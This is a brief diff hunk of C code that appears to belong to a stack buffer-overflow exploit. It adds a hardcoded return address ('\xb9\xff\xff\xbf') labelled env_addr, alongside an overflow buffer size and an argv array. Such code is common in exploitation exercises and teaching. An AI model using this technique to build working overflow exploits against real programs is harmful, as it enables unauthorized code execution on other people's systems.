@@ -9,6 +9,8 @@
 
 #define BUFFER_SIZE 408
 
+static char env_addr[] = "\xb9\xff\xff\xbf";
+
 int main(void)
 {
   char *args[3]; 
